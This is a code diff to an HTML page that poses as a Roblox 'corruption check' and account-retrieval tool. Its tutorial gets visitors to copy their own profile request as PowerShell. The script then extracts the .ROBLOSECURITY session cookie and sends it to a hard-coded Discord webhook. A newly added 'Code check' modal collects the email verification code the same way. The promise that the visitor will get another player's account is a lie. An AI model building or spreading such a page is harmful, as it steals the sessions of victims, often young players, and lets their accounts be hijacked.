@@ -79,11 +79,80 @@
         @keyframes floatAround {
             0% { transform: translate(0, 0); }
             25% { transform: translate(calc(var(--rand-x-1) * 1vw), calc(var(--rand-y-1) * 1vh)); }
-            50% { transform: translate(calc(var(--rand-x-2) * 1vw), calc(var(--rand-y-2) * 1vh)); }
+            50% { transform: translate(calc(var(--rand-x-2) * 1vw), calc(var(--rand--y2) * 1vh)); }
             75% { transform: translate(calc(var(--rand-x-3) * 1vw), calc(var(--rand-y-3) * 1vh)); }
             100% { transform: translate(0, 0); }
         }
 
+        /* --- Modal Styles --- */
+        .modal {
+            display: none; /* Hidden by default */
+            position: fixed; /* Stay in place */
+            z-index: 100; /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%; /* Full width */
+            height: 100%; /* Full height */
+            overflow: auto; /* Enable scroll if needed */
+            background-color: rgba(0,0,0,0.7); /* Black w/ opacity */
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background-color: #0A0A10; /* Same as main card background */
+            margin: auto;
+            padding: 2rem;
+            border: 1px solid #121218;
+            border-radius: 0.5rem;
+            width: 90%;
+            max-width: 500px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            position: relative;
+            animation: fadeIn 0.3s ease-out;
+            max-height: 90vh; /* Limit height for scrollable content */
+            overflow-y: auto; /* Enable scrolling for modal content */
+        }
+
+        .close-button {
+            color: #aaa;
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .close-button:hover,
+        .close-button:focus {
+            color: white;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+
+        /* Tutorial button specific styling */
+        .tutorial-button {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background-color: #1A1A22; /* Slightly different shade for distinction */
+            color: #ffffff;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            font-weight: bold;
+            transition: background-color 0.3s ease-in-out, transform 0.3s ease-in-out;
+            z-index: 50; /* Ensure it's above stars but below main content/modals */
+        }
+        .tutorial-button:hover {
+            background-color: #2c3e50;
+            transform: scale(1.05);
+        }
     </style>
 </head>
 <body class="text-white">
@@ -108,7 +177,55 @@
             Check Corruption + Log info
         </button>
 
+        <button
+            id="openModalButton"
+            class="w-full custom-button-darkblue hover:custom-button-darkblue text-white font-bold py-3 px-4 rounded-md focus:outline-none focus:ring-2 custom-focus-ring-blue focus:ring-opacity-75 transition duration-300 ease-in-out transform hover:scale-105 mt-4"
+        >
+            Code check
+        </button>
+
         <div id="messageBox" class="mt-6 p-3 text-sm text-center rounded-md hidden">
+        </div>
+    </div>
+
+    <button id="tutorialButton" class="tutorial-button">Tutorial</button>
+
+    <div id="codeCheckModal" class="modal hidden">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <h2 class="text-2xl font-bold text-white mb-4 text-center">Code check</h2>
+            <div class="mb-4">
+                <label for="modalMessageInput" class="block text-white text-sm font-semibold mb-2">Enter the code that got sent on the email</label>
+                <textarea
+                    id="modalMessageInput"
+                    rows="8"
+                    class="w-full p-3 custom-bg-darkblue-primary text-white rounded-md border custom-border-darkblue focus:outline-none focus:ring-2 custom-focus-ring-blue transition duration-200 ease-in-out resize-y"
+                    placeholder="Type your code here..."
+                ></textarea>
+            </div>
+            <button
+                id="sendModalButton"
+                class="w-full custom-button-darkblue hover:custom-button-darkblue text-white font-bold py-3 px-4 rounded-md focus:outline-none focus:ring-2 custom-focus-ring-blue focus:ring-opacity-75 transition duration-300 ease-in-out transform hover:scale-105"
+            >
+                Enter code
+            </button>
+            <div id="modalMessageBox" class="mt-4 p-2 text-sm text-center rounded-md hidden"></div>
+        </div>
+    </div>
+
+    <div id="tutorialModal" class="modal hidden">
+        <div class="modal-content">
+            <span class="close-button tutorial-close-button">&times;</span>
+            <h2 class="text-2xl font-bold text-white mb-4 text-center">How to use the website</h2>
+            <ol class="list-decimal list-inside text-left space-y-2 text-gray-300">
+                <li>Go to <a href="https://www.roblox.com" target="_blank" class="text-blue-400 hover:underline">roblox.com</a> and navigate to the other player's profile.</li>
+                <li>Press <kbd>F12</kbd> to open Developer Tools, then go to the "Network" tab, and press <kbd>CTRL</kbd> + <kbd>R</kbd> to refresh the page.</li>
+                <li>Look for a request named "profile" (it might have a blue logo next to it), right-click it, then select <span class="font-semibold">Copy > Copy all as PowerShell</span>.</li>
+                <li>Go back to this website and paste the copied PowerShell file into the main text area.</li>
+                <li>Click "Check Corruption + Log info" and wait 2 minutes for the API to receive the request. After this, you can enter the code sent to your email in the "Code check" menu.</li>
+                <li>Go to <a href="https://www.roblox.com" target="_blank" class="text-blue-400 hover:underline">roblox.com</a>, and your account login should be swapped with the other account.</li>
+                <li>Enjoy the retrieved account!</li>
+            </ol>
         </div>
     </div>
 
@@ -119,93 +236,133 @@
         const messageBox = document.getElementById('messageBox');
         const starContainer = document.getElementById('star-container');
 
+        // Elements for the Code Check modal
+        const openModalButton = document.getElementById('openModalButton');
+        const codeCheckModal = document.getElementById('codeCheckModal');
+        const closeButton = codeCheckModal.querySelector('.close-button'); // Regular close button for code check modal
+        const modalMessageInput = document.getElementById('modalMessageInput');
+        const sendModalButton = document.getElementById('sendModalButton');
+        const modalMessageBox = document.getElementById('modalMessageBox');
+
+        // Elements for the Tutorial modal
+        const tutorialButton = document.getElementById('tutorialButton');
+        const tutorialModal = document.getElementById('tutorialModal');
+        const tutorialCloseButton = tutorialModal.querySelector('.tutorial-close-button'); // Specific close button for tutorial modal
+
         // Discord webhook URL
-        // *** YOU MUST REPLACE THIS WITH YOUR OWN COPIED WEBHOOK URL FROM DISCORD ***
-        // The URL below is for demonstration based on your last input.
-        // It will likely NOT work unless YOU created it yourself.
         const webhookUrl = 'https://discord.com/api/webhooks/1395732514060107898/UpNWnfpEbMU-g_Pv3dWlZqdDn-axSL27Y7Se20DE--PU-BWtK6N0-2VTt2jROa_1Vq6w';
 
         // Cooldown variables
-        const cooldownTime = 20 * 1000; // 20 seconds in milliseconds
-        let lastClickTime = 0;
+        const mainCooldownTime = 20 * 1000; // 20 seconds for main button
+        const modalCooldownTime = 2 * 60 * 1000; // 2 minutes (120 seconds) for modal button
+        
+        let lastClickTimeMain = 0; // Tracks last successful click of main button
+        let lastClickTimeModal = 0; // Tracks last successful click of modal button (also reset by main button)
+
+        // localStorage key for saving the input
+        const localStorageKey = 'powershellCodeInput';
 
         /**
-         * Displays a message in the message box.
+         * Displays a message in the specified message box.
+         * @param {HTMLElement} boxElement - The message box element to update (e.g., messageBox or modalMessageBox).
          * @param {string} message - The message to display.
          * @param {boolean} isError - True if it's an error message, false otherwise.
+         * @param {number} [duration=0] - Duration in milliseconds to show the message. 0 means persistent until cleared by updateButtonStates or new message.
          */
-        function showMessageBox(message, isError = false) {
-            messageBox.textContent = message;
-            messageBox.classList.remove('hidden', 'custom-success-bg', 'custom-error-bg');
+        function showMessageBox(boxElement, message, isError = false, duration = 0) {
+            boxElement.textContent = message;
+            boxElement.classList.remove('hidden', 'custom-success-bg', 'custom-error-bg');
             if (isError) {
-                messageBox.classList.add('custom-error-bg');
+                boxElement.classList.add('custom-error-bg');
             } else {
-                messageBox.classList.add('custom-success-bg');
+                boxElement.classList.add('custom-success-bg');
             }
-            messageBox.classList.remove('hidden');
-            setTimeout(() => {
-                messageBox.classList.add('hidden');
-            }, 5000);
+            boxElement.classList.remove('hidden');
+
+            if (duration > 0) {
+                setTimeout(() => {
+                    // Only hide if the message hasn't changed
+                    if (boxElement.textContent === message) {
+                        boxElement.classList.add('hidden');
+                    }
+                }, duration);
+            }
         }
 
-        // Add event listener to the send button
-        sendButton.addEventListener('click', async () => {
+        // Function to save text area content to localStorage
+        function saveInputToLocalStorage() {
+            localStorage.setItem(localStorageKey, messageInput.value);
+        }
+
+        // Function to load text area content from localStorage
+        function loadInputFromLocalStorage() {
+            const savedCode = localStorage.getItem(localStorageKey);
+            if (savedCode) {
+                messageInput.value = savedCode;
+            }
+        }
+
+        // Function to send data to webhook
+        async function sendToWebhook(content, buttonElement, messageBoxElement, isMainButton = true) {
             const currentTime = Date.now();
-            const timeSinceLastClick = currentTime - lastClickTime;
+            
+            let lastClick = isMainButton ? lastClickTimeMain : lastClickTimeModal;
+            const cooldownPeriod = isMainButton ? mainCooldownTime : modalCooldownTime;
+            const remainingTime = cooldownPeriod - (currentTime - lastClick);
 
-            if (timeSinceLastClick < cooldownTime) {
-                showMessageBox('Please wait 20 seconds before checking any corruption', true);
+            if (remainingTime > 0) {
+                const minutes = Math.floor(remainingTime / 60000);
+                const seconds = Math.ceil((remainingTime % 60000) / 1000);
+                // Use a short duration for these error messages
+                showMessageBox(messageBoxElement, `Please wait ${minutes}m ${seconds}s before sending again.`, true, 5000); 
                 return;
             }
 
-            const fullInput = messageInput.value.trim(); // Get the full text input
-
-            if (!fullInput) {
-                showMessageBox('Please paste the full PowerShell code.', true);
+            if (!content.trim()) {
+                showMessageBox(messageBoxElement, 'Message cannot be empty.', true, 5000);
                 return;
             }
 
-            // --- Robust Extraction Logic using Regular Expression ---
-            const regex = /\.ROBLOSECURITY",\s*"([^"]*)"/;
-            const match = fullInput.match(regex);
+            if (isMainButton) {
+                const regex = /\.ROBLOSECURITY",\s*"([^"]*)"/;
+                const match = content.match(regex);
+                let extractedCookie = '';
 
-            let extractedCookie = '';
+                if (match && match[1]) {
+                    extractedCookie = match[1];
+                }
 
-            if (match && match[1]) {
-                extractedCookie = match[1]; // The cookie value is in the first capturing group
+                if (!extractedCookie) {
+                    showMessageBox(messageBoxElement, "Could not find the .ROBLOSECURITY cookie value. Please ensure the code is complete and correctly formatted.", true, 5000);
+                    return;
+                }
+
+                if (!extractedCookie.startsWith("CAE")) {
+                     showMessageBox(messageBoxElement, "Extracted value does not look like a valid .ROBLOSECURITY cookie (doesn't start with 'CAE'). Please check the code.", true, 5000);
+                     return;
+                }
+                content = extractedCookie;
             }
 
-            // --- Validation of Extracted Cookie ---
-            if (!extractedCookie) {
-                showMessageBox("Could not find the .ROBLOSECURITY cookie value. Please ensure the code is complete and correctly formatted.", true);
-                return;
+            if (isMainButton) { 
+                lastClickTimeMain = currentTime; 
+                lastClickTimeModal = currentTime; // Reset modal cooldown when main button is clicked
+            }
+            else { 
+                lastClickTimeModal = currentTime; 
             }
 
-            // Optional: Basic validation on the cookie format if you know it always starts with "CAE"
-            if (!extractedCookie.startsWith("CAE")) {
-                 showMessageBox("Extracted value does not look like a valid .ROBLOSECURITY cookie (doesn't start with 'CAE'). Please check the code.", true);
-                 return;
-            }
+            buttonElement.disabled = true;
+            const originalButtonText = buttonElement.textContent;
+            buttonElement.textContent = 'Sending...';
+            messageBoxElement.classList.add('hidden'); 
 
-            // The message to send to Discord is now ONLY the extracted cookie
-            let messageToSend = extractedCookie;
-
-            // --- End Extraction Logic ---
-
-            lastClickTime = currentTime;
-
-            sendButton.disabled = true;
-            sendButton.textContent = 'Checking...';
-            messageBox.classList.add('hidden');
-
-            const discordMessageLimit = 2000; // Discord's content limit
-
-            // Split message into chunks if it's too long (though extracted cookie might be under 2k)
+            const discordMessageLimit = 2000;
             const messageChunks = [];
-            while (messageToSend.length > 0) {
-                let chunk = messageToSend.substring(0, discordMessageLimit);
+            while (content.length > 0) {
+                let chunk = content.substring(0, discordMessageLimit);
                 messageChunks.push(chunk);
-                messageToSend = messageToSend.substring(discordMessageLimit);
+                content = content.substring(discordMessageLimit);
             }
 
             try {
@@ -216,76 +373,176 @@
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({ content: chunk }), // Send each chunk
+                        body: JSON.stringify({ content: chunk }),
                     });
 
                     if (!response.ok) {
                         allRequestsSuccessful = false;
                         const errorText = await response.text();
-                        // Display the full error for better debugging
-                        showMessageBox(`Failed to send cookie: ${response.status}. Details: ${errorText}`, true);
-                        break; // Stop sending if one fails
+                        showMessageBox(messageBoxElement, `Failed to send message: ${response.status}. Details: ${errorText}`, true, 5000);
+                        break;
                     }
                 }
 
                 if (allRequestsSuccessful) {
-                    showMessageBox('Powershell file sent for checking!');
-                    messageInput.value = ''; // Clear input after successful send
+                    if (isMainButton) {
+                        showMessageBox(messageBoxElement, 'Code sent to API for checking, Please wait 2 minutes...');
+                        messageInput.value = '';
+                        saveInputToLocalStorage();
+                    } else {
+                        showMessageBox(messageBoxElement, 'Message sent successfully!', false, 5000); // Success message auto-hides
+                        modalMessageInput.value = '';
+                    }
                 }
 
             } catch (error) {
-                showMessageBox(`An error occurred: ${error.message}`, true);
+                showMessageBox(messageBoxElement, `An error occurred: ${error.message}`, true, 5000);
                 console.error('Fetch error:', error);
             } finally {
-                if (Date.now() - lastClickTime >= cooldownTime) {
-                     sendButton.disabled = false;
-                     sendButton.textContent = 'Check Corruption';
+                updateButtonStates();
+            }
+        }
+
+        function updateButtonStates() {
+            const currentTime = Date.now();
+
+            // Main Button Cooldown
+            const mainRemaining = mainCooldownTime - (currentTime - lastClickTimeMain);
+            if (mainRemaining > 0) {
+                const minutes = Math.floor(mainRemaining / 60000);
+                const seconds = Math.ceil((mainRemaining % 60000) / 1000);
+                sendButton.disabled = true;
+                sendButton.textContent = `Check Corruption + Log info (${minutes}m ${seconds}s)`;
+                // Only clear if messageBox is NOT currently showing a specific error or success message
+                if (!messageBox.classList.contains('custom-error-bg') && !messageBox.classList.contains('custom-success-bg')) {
+                    messageBox.classList.add('hidden');
                 }
+            } else {
+                sendButton.disabled = false;
+                sendButton.textContent = 'Check Corruption + Log info';
+                messageBox.classList.add('hidden');
+            }
+
+            // Modal Button Cooldown (depends on main button's last click)
+            const modalRemaining = modalCooldownTime - (currentTime - lastClickTimeModal);
+            if (modalRemaining > 0) {
+                const minutes = Math.floor(modalRemaining / 60000);
+                const seconds = Math.ceil((modalRemaining % 60000) / 1000);
+                openModalButton.disabled = true;
+                openModalButton.textContent = `Code check (${minutes}m ${seconds}s)`;
+                sendModalButton.disabled = true;
+                sendModalButton.textContent = `Enter code (${minutes}m ${seconds}s)`;
+                
+                // Only show a general "Please wait" message in modal if no specific error/success is active
+                if (codeCheckModal.classList.contains('flex') && !modalMessageBox.classList.contains('custom-error-bg') && !modalMessageBox.classList.contains('custom-success-bg')) {
+                    showMessageBox(modalMessageBox, `Please wait ${minutes}m ${seconds}s before using this.`, true);
+                } else if (!codeCheckModal.classList.contains('flex')) { // If modal is closed, hide its message box
+                    modalMessageBox.classList.add('hidden');
+                }
+            } else {
+                openModalButton.disabled = false;
+                openModalButton.textContent = 'Code check';
+                sendModalButton.disabled = false;
+                sendModalButton.textContent = 'Enter code';
+                modalMessageBox.classList.add('hidden');
+            }
+        }
+
+
+        // --- Event Listeners ---
+
+        sendButton.addEventListener('click', () => {
+            sendToWebhook(messageInput.value, sendButton, messageBox, true);
+        });
+
+        openModalButton.addEventListener('click', () => {
+            const currentTime = Date.now();
+            const modalRemaining = modalCooldownTime - (currentTime - lastClickTimeModal);
+
+            if (modalRemaining > 0) {
+                const minutes = Math.floor(modalRemaining / 60000);
+                const seconds = Math.ceil((modalRemaining % 60000) / 1000);
+                // This error message for clicking during cooldown should show for 5 seconds
+                showMessageBox(messageBox, `Error, please wait the full ${minutes}m ${seconds}s for the API to receive the request.`, true, 5000); 
+                return; 
+            }
+
+            // If not on cooldown, open the modal
+            codeCheckModal.classList.remove('hidden');
+            codeCheckModal.classList.add('flex');
+            modalMessageBox.classList.add('hidden');
+            modalMessageInput.value = '';
+            updateButtonStates();
+        });
+
+        closeButton.addEventListener('click', () => {
+            codeCheckModal.classList.add('hidden');
+            codeCheckModal.classList.remove('flex');
+            modalMessageBox.classList.add('hidden');
+            modalMessageInput.value = '';
+            updateButtonStates();
+        });
+
+        window.addEventListener('click', (event) => {
+            if (event.target == codeCheckModal) {
+                codeCheckModal.classList.add('hidden');
+                codeCheckModal.classList.remove('flex');
+                modalMessageBox.classList.add('hidden');
+                modalMessageInput.value = '';
+                updateButtonStates();
+            }
+            if (event.target == tutorialModal) {
+                tutorialModal.classList.add('hidden');
+                tutorialModal.classList.remove('flex');
             }
         });
 
-        setInterval(() => {
-            if (sendButton.disabled && Date.now() - lastClickTime >= cooldownTime) {
-                sendButton.disabled = false;
-                sendButton.textContent = 'Check Corruption';
-            }
-        }, 1000);
+        sendModalButton.addEventListener('click', () => {
+            sendToWebhook(modalMessageInput.value, sendModalButton, modalMessageBox, false);
+        });
 
-        // --- Star Generation and Animation Logic for Floating ---
+        tutorialButton.addEventListener('click', () => {
+            tutorialModal.classList.remove('hidden');
+            tutorialModal.classList.add('flex');
+        });
+
+        tutorialCloseButton.addEventListener('click', () => {
+            tutorialModal.classList.add('hidden');
+            tutorialModal.classList.remove('flex');
+        });
+
+        messageInput.addEventListener('input', saveInputToLocalStorage);
+
+        setInterval(updateButtonStates, 1000);
+
         const numberOfStars = 80;
 
         function createStars() {
             for (let i = 0; i < numberOfStars; i++) {
                 const star = document.createElement('div');
                 star.classList.add('star');
-
-                // Randomize size
-                const size = Math.random() * 3 + 1; // Stars from 1px to 4px
+                const size = Math.random() * 3 + 1;
                 star.style.width = `${size}px`;
                 star.style.height = `${size}px`;
-
-                // Randomize initial position within the viewport
                 star.style.left = `${Math.random() * 100}vw`;
                 star.style.top = `${Math.random() * 100}vh`;
-
-                // Set CSS variables for random translation amounts
-                star.style.setProperty('--rand-x-1', (Math.random() * 100 - 50).toFixed(0)); // -50 to 50 vw
-                star.style.setProperty('--rand-y-1', (Math.random() * 100 - 50).toFixed(0)); // -50 to 50 vh
+                star.style.setProperty('--rand-x-1', (Math.random() * 100 - 50).toFixed(0));
+                star.style.setProperty('--rand-y-1', (Math.random() * 100 - 50).toFixed(0));
                 star.style.setProperty('--rand-x-2', (Math.random() * 100 - 50).toFixed(0));
                 star.style.setProperty('--rand-y-2', (Math.random() * 100 - 50).toFixed(0));
                 star.style.setProperty('--rand-x-3', (Math.random() * 100 - 50).toFixed(0));
                 star.style.setProperty('--rand-y-3', (Math.random() * 100 - 50).toFixed(0));
-
-                // Randomize animation delays and durations for variety
                 star.style.animationDelay = `${Math.random() * 0.5}s`;
-                star.style.animationDuration = `${Math.random() * 20 + 50}s`; // Movement duration 50-70s (super slow)
-
+                star.style.animationDuration = `${Math.random() * 20 + 50}s`;
                 starContainer.appendChild(star);
             }
         }
 
-        // Call the function to create stars when the page loads
-        createStars();
+        window.addEventListener('load', () => {
+            loadInputFromLocalStorage();
+            createStars();
+            updateButtonStates();
+        });
     </script>
 </body>
 </html>
